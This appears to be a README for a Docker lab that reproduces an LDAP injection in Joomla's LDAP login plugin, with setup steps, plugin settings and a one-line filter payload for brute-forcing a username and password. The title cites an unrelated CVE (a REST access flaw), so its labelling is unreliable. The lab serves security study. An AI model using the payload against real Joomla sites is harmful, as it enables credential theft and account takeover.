# Joomla REST Unauthorized Access Vulnerability(CVE-2023-23752)

## Introduction

A [LDAP injection](https://www.synopsys.com/glossary/what-is-ldap-injection.html#:~:text=What%20is%20LDAP%20injection%3F%20LDAP%20injection%20is%20a,special%20characters%20%28e.g.%2C%20brackets%2C%20asterisks%2C%20ampersands%2C%20or%20quotes%29.) was discoverd by RISP, it can be used to burp the username and password of joomla if the default LDAP plugin was configured.

The poc looks like

```
XXX;!(|(!(uid=user*))(!(userPassword=password*)))
```

A presentation video can be found on [twitter](https://twitter.com/ripstech/status/1094999251417993216)

## Setup

Run

```bash
docker-compose up
```

Install `joomla` with

```
Host Name: mysql:3306
Database Name: joomla
Database Username: root
Database Password: root
```

After installation, delete the folder `/var/www/html/plugins/quickicon/phpversionchecker` in `joomla` container.

Login in with your admin account and enable default `LDAP` plugin, and configure as below

```
Host: openldap
Port: 1389
LDAP V3: Yes
Negotiate TLS: No
Follow Referrals: No
Authorisation Method: Bind and Search
Base DN: dc=example,dc=org
Search String: uid=[search]
User's DN: cn=[username],ou=users,dc=example,dc=org
Connect Username:
Connect Password:
Map: Full Name: fullName
Map: Email: mail
Map: User ID: uid
```

save and close it.

Now we need to create a new user in `super Users` groups with same name of our openldap server (**but not same password**), in this case it's `user01`.

After that, your can logout and try to burp the `user01` and it `password`.
